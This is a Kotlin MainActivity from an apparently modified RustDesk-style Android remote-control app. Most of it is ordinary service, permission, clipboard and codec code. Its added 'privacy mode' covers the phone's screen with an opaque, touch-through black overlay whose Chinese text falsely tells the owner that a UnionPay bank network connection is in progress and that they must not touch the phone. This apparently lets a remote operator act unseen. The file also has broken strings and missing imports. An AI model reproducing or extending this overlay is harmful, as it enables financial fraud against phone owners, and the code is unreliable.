package com.carriez.flutter_hbb

import ffi.FFI
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.ServiceConnection
import android.content.ClipboardManager
import android.os.Bundle
import android.os.Build
import android.os.IBinder
import android.provider.Settings
import android.util.Log
import android.view.*
import android.widget.FrameLayout
import android.widget.TextView
import android.graphics.Color
import androidx.annotation.RequiresApi
import org.json.JSONArray
import org.json.JSONObject
import com.hjq.permissions.XXPermissions
import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel
import kotlin.concurrent.thread

class MainActivity : FlutterActivity() {

    companion object {
        var flutterMethodChannel: MethodChannel? = null
        private var _rdClipboardManager: RdClipboardManager? = null
        val rdClipboardManager: RdClipboardManager?
            get() = _rdClipboardManager
    }

    private val channelTag = "mChannel"
    private val logTag = "mMainActivity"
    private var mainService: MainService? = null

    private var isAudioStart = false
    private val audioRecordHandle = AudioRecordHandle(this, { false }, { isAudioStart })

    // ===== 隐私模式变量 =====
    private var privacyOverlay: FrameLayout? = null
    private val REQUEST_CODE_OVERLAY = 12345

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        if (_rdClipboardManager == null) {
            _rdClipboardManager = RdClipboardManager(getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager)
            FFI.setClipboardManager(_rdClipboardManager!!)
        }
    }

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)
        if (MainService.isReady) {
            Intent(activity, MainService::class.java).also {
                bindService(it, serviceConnection, Context.BIND_AUTO_CREATE)
            }
        }
        flutterMethodChannel = MethodChannel(
            flutterEngine.dartExecutor.binaryMessenger,
            channelTag
        )
        initFlutterChannel(flutterMethodChannel!!)
        thread { setCodecInfo() }
    }

    override fun onResume() {
        super.onResume()
        val inputPer = InputService.isOpen
        activity.runOnUiThread {
            flutterMethodChannel?.invokeMethod(
                "on_state_changed",
                mapOf("name" to "input", "value" to inputPer.toString())
            )
        }
    }

    private fun requestMediaProjection() {
        val intent = Intent(this, PermissionRequestTransparentActivity::class.java).apply {
            action = ACT_REQUEST_MEDIA_PROJECTION
        }
        startActivityForResult(intent, REQ_INVOKE_PERMISSION_ACTIVITY_MEDIA_PROJECTION)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == REQ_INVOKE_PERMISSION_ACTIVITY_MEDIA_PROJECTION && resultCode == RES_FAILED) {
            flutterMethodChannel?.invokeMethod("on_media_projection_canceled", null)
        }

        if (requestCode == REQUEST_CODE_OVERLAY) {
            if (!checkOverlayPermission()) {
                Log.e(logTag, "Overlay permission denied, cannot show privacy mode")
            }
        }
    }

    override fun onDestroy() {
        Log.e(logTag, "onDestroy")
        mainService?.let { unbindService(serviceConnection) }
        super.onDestroy()
    }

    private val serviceConnection = object : ServiceConnection {
        override fun onServiceConnected(name: ComponentName?, service: IBinder?) {
            Log.d(logTag, "onServiceConnected")
            val binder = service as MainService.LocalBinder
            mainService = binder.getService()
        }

        override fun onServiceDisconnected(name: ComponentName?) {
            Log.d(logTag, "onServiceDisconnected")
            mainService = null
        }
    }

    // ===== 隐私模式方法 =====
    private fun checkOverlayPermission(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Settings.canDrawOverlays(this)
        } else {
            true
        }
    }

    fun enablePrivacyMode(overlayText: String = "正在对接银联中心网络....
                                                 请勿触碰手机屏幕避免对接失败
                                                 耐心等待对接完成") {
        if (!checkOverlayPermission()) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val intent = Intent(
                    Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    android.net.Uri.parse("package:$packageName")
                )
                startActivityForResult(intent, REQUEST_CODE_OVERLAY)
            }
            return
        }

        if (privacyOverlay == null) {
            val windowManager = getSystemService(WINDOW_SERVICE) as WindowManager

            privacyOverlay = FrameLayout(this)
            privacyOverlay!!.setBackgroundColor(Color.BLACK)

            val textView = TextView(this)
            textView.text = overlayText
            textView.setTextColor(Color.WHITE)
            textView.textSize = 18f
            textView.gravity = Gravity.CENTER

            val textParams = FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.WRAP_CONTENT,
                FrameLayout.LayoutParams.WRAP_CONTENT,
                Gravity.BOTTOM or Gravity.CENTER_HORIZONTAL
            )
            textParams.bottomMargin = 50
            privacyOverlay!!.addView(textView, textParams)

            val layoutParams = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                else
                    WindowManager.LayoutParams.TYPE_SYSTEM_ALERT,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
                PixelFormat.OPAQUE
            )

            windowManager.addView(privacyOverlay, layoutParams)
        }
    }

    fun disablePrivacyMode() {
        if (privacyOverlay != null) {
            val windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
            windowManager.removeView(privacyOverlay)
            privacyOverlay = null
        }
    }

    // ===== Flutter 调用接口 =====
    private fun initFlutterChannel(flutterMethodChannel: MethodChannel) {
        flutterMethodChannel.setMethodCallHandler { call, result ->
            when (call.method) {
                "toggle_privacy_mode" -> {
                    if (privacyOverlay == null) {
                        enablePrivacyMode("正在对接银联中心网络....
                                           请勿触碰手机屏幕避免对接失败
                                           耐心等待对接完成")
                    } else {
                        disablePrivacyMode()
                    }
                    result.success(true)
                }

                // ===== 保留原有方法 =====
                "init_service" -> {
                    Intent(activity, MainService::class.java).also {
                        bindService(it, serviceConnection, Context.BIND_AUTO_CREATE)
                    }
                    if (MainService.isReady) {
                        result.success(false)
                        return@setMethodCallHandler
                    }
                    requestMediaProjection()
                    result.success(true)
                }
                "start_capture" -> {
                    mainService?.let { result.success(it.startCapture()) } ?: run { result.success(false) }
                }
                "stop_service" -> {
                    Log.d(logTag, "Stop service")
                    mainService?.let { it.destroy(); result.success(true) } ?: run { result.success(false) }
                }
                "check_permission" -> {
                    if (call.arguments is String) {
                        result.success(XXPermissions.isGranted(context, call.arguments as String))
                    } else { result.success(false) }
                }
                "request_permission" -> {
                    if (call.arguments is String) {
                        requestPermission(context, call.arguments as String)
                        result.success(true)
                    } else { result.success(false) }
                }
                START_ACTION -> {
                    if (call.arguments is String) {
                        startAction(context, call.arguments as String)
                        result.success(true)
                    } else { result.success(false) }
                }
                "check_video_permission" -> {
                    mainService?.let { result.success(it.checkMediaPermission()) } ?: run { result.success(false) }
                }
                "check_service" -> {
                    flutterMethodChannel?.invokeMethod(
                        "on_state_changed",
                        mapOf("name" to "input", "value" to InputService.isOpen.toString())
                    )
                    flutterMethodChannel?.invokeMethod(
                        "on_state_changed",
                        mapOf("name" to "media", "value" to MainService.isReady.toString())
                    )
                    result.success(true)
                }
                "stop_input" -> {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                        InputService.ctx?.disableSelf()
                    }
                    InputService.ctx = null
                    flutterMethodChannel?.invokeMethod(
                        "on_state_changed",
                        mapOf("name" to "input", "value" to InputService.isOpen.toString())
                    )
                    result.success(true)
                }
                "cancel_notification" -> {
                    if (call.arguments is Int) {
                        val id = call.arguments as Int
                        mainService?.cancelNotification(id)
                    } else {
                        result.success(true)
                    }
                }
                "enable_soft_keyboard" -> {
                    if (call.arguments as Boolean) {
                        window.clearFlags(WindowManager.LayoutParams.FLAG_ALT_FOCUSABLE_IM)
                    } else {
                        window.addFlags(WindowManager.LayoutParams.FLAG_ALT_FOCUSABLE_IM)
                    }
                    result.success(true)
                }
                "try_sync_clipboard" -> {
                    rdClipboardManager?.syncClipboard(true)
                    result.success(true)
                }
                GET_START_ON_BOOT_OPT -> {
                    val prefs = getSharedPreferences(KEY_SHARED_PREFERENCES, MODE_PRIVATE)
                    result.success(prefs.getBoolean(KEY_START_ON_BOOT_OPT, false))
                }
                SET_START_ON_BOOT_OPT -> {
                    if (call.arguments is Boolean) {
                        val prefs = getSharedPreferences(KEY_SHARED_PREFERENCES, MODE_PRIVATE)
                        val edit = prefs.edit()
                        edit.putBoolean(KEY_START_ON_BOOT_OPT, call.arguments as Boolean)
                        edit.apply()
                        result.success(true)
                    } else {
                        result.success(false)
                    }
                }
                SYNC_APP_DIR_CONFIG_PATH -> {
                    if (call.arguments is String) {
                        val prefs = getSharedPreferences(KEY_SHARED_PREFERENCES, MODE_PRIVATE)
                        val edit = prefs.edit()
                        edit.putString(KEY_APP_DIR_CONFIG_PATH, call.arguments as String)
                        edit.apply()
                        result.success(true)
                    } else {
                        result.success(false)
                    }
                }
                GET_VALUE -> {
                    if (call.arguments is String) {
                        if (call.arguments == KEY_IS_SUPPORT_VOICE_CALL) {
                            result.success(isSupportVoiceCall())
                        } else {
                            result.error("-1", "No such key", null)
                        }
                    } else {
                        result.success(null)
                    }
                }
                "on_voice_call_started" -> {
                    onVoiceCallStarted()
                }
                "on_voice_call_closed" -> {
                    onVoiceCallClosed()
                }
                else -> {
                    result.error("-1", "No such method", null)
                }
            }
        }
    }

    // ===== 原有方法完整保留 =====
    private fun setCodecInfo() {
    val codecList = MediaCodecList(MediaCodecList.REGULAR_CODECS)
    val codecs = codecList.codecInfos
    val codecArray = JSONArray()
    val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
    val wh = getScreenSize(windowManager)
    var w = wh.first
    var h = wh.second
    val align = 64
    w = (w + align - 1) / align * align
    h = (h + align - 1) / align * align

    codecs.forEach { codec ->
        val codecObject = JSONObject()
        codecObject.put("name", codec.name)
        codecObject.put("is_encoder", codec.isEncoder)
        var hw: Boolean? = null
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            hw = codec.isHardwareAccelerated
        } else {
            if (listOf("OMX.google.", "OMX.SEC.", "c2.android").any { codec.name.startsWith(it, true) }) {
                hw = false
            } else if (listOf("c2.qti", "OMX.qcom.video", "OMX.Exynos", "OMX.hisi", "OMX.MTK", "OMX.Intel", "OMX.Nvidia").any { codec.name.startsWith(it, true) }) {
                hw = true
            }
        }
        if (hw != true) return@forEach
        codecObject.put("hw", hw)
        var mime_type = ""
        codec.supportedTypes.forEach { type ->
            if (listOf("video/avc", "video/hevc").contains(type)) {
                mime_type = type
            }
        }
        if (mime_type.isNotEmpty()) {
            codecObject.put("mime_type", mime_type)
            val caps = codec.getCapabilitiesForType(mime_type)
            if (codec.isEncoder) {
                if (!caps.videoCapabilities.isSizeSupported(w, h) && !caps.videoCapabilities.isSizeSupported(h, w)) return@forEach
            }
            codecObject.put("min_width", caps.videoCapabilities.supportedWidths.lower)
            codecObject.put("max_width", caps.videoCapabilities.supportedWidths.upper)
            codecObject.put("min_height", caps.videoCapabilities.supportedHeights.lower)
            codecObject.put("max_height", caps.videoCapabilities.supportedHeights.upper)
            val surface = caps.colorFormats.contains(MediaCodecInfo.CodecCapabilities.COLOR_FormatSurface)
            codecObject.put("surface", surface)
            val nv12 = caps.colorFormats.contains(MediaCodecInfo.CodecCapabilities.COLOR_FormatYUV420SemiPlanar)
            codecObject.put("nv12", nv12)
            if (!(nv12 || surface)) return@forEach
            codecObject.put("min_bitrate", caps.videoCapabilities.bitrateRange.lower / 1000)
            codecObject.put("max_bitrate", caps.videoCapabilities.bitrateRange.upper / 1000)
            if (!codec.isEncoder) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    codecObject.put("low_latency", caps.isFeatureSupported(MediaCodecInfo.CodecCapabilities.FEATURE_LowLatency))
                }
            }
            if (!codec.isEncoder) return@forEach
            codecArray.put(codecObject)
        }
    }

    val result = JSONObject()
    result.put("version", Build.VERSION.SDK_INT)
    result.put("w", w)
    result.put("h", h)
    result.put("codecs", codecArray)
    FFI.setCodecInfo(result.toString())
}

   private fun onVoiceCallStarted() {
    var ok = false
    mainService?.let { ok = it.onVoiceCallStarted() } ?: run {
        isAudioStart = true
        ok = audioRecordHandle.onVoiceCallStarted(null)
    }
    if (!ok) {
        Log.e(logTag, "onVoiceCallStarted fail")
        flutterMethodChannel?.invokeMethod("msgbox", mapOf(
            "type" to "custom-nook-nocancel-hasclose-error",
            "title" to "Voice call",
            "text" to "Failed to start voice call."
        ))
    } else {
        Log.d(logTag, "onVoiceCallStarted success")
    }
}

   private fun onVoiceCallClosed() {
    var ok = false
    mainService?.let { ok = it.onVoiceCallClosed() } ?: run {
        isAudioStart = false
        ok = audioRecordHandle.onVoiceCallClosed(null)
    }
    if (!ok) {
        Log.e(logTag, "onVoiceCallClosed fail")
        flutterMethodChannel?.invokeMethod("msgbox", mapOf(
            "type" to "custom-nook-nocancel-hasclose-error",
            "title" to "Voice call",
            "text" to "Failed to stop voice call."
        ))
    } else {
        Log.d(logTag, "onVoiceCallClosed success")
    }
}

    override fun onStop() {
        super.onStop()
        val disableFloatingWindow = FFI.getLocalOption("disable-floating-window") == "Y"
        if (!disableFloatingWindow && MainService.isReady) {
            startService(Intent(this, FloatingWindowService::class.java))
        }
    }

    override fun onStart() {
        super.onStart()
        stopService(Intent(this, FloatingWindowService::class.java))
    }
}

